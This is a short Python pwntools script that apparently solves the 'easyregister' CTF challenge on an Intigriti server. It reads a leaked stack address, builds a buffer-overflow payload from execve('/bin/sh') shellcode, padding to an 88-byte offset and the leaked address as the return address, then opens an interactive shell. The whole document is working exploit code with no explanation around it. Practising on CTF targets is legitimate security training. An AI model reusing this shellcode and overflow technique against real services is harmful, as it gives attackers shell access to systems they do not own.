from pwn import *

#nc easyregister.ctf.intigriti.io 7777
p = remote('easyregister.ctf.intigriti.io',7777)

p.recvuntil(b'Initialized attendee listing at ')
addr = p.recvuntil(b'.')[:-1]
p.recv()

offset = 88
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
ff = int(addr.decode(),16)

payload = b''
payload += shellcode
payload += b'A' * (offset - len(shellcode))
payload += p64(ff)

p.sendline(payload)
p.interactive()
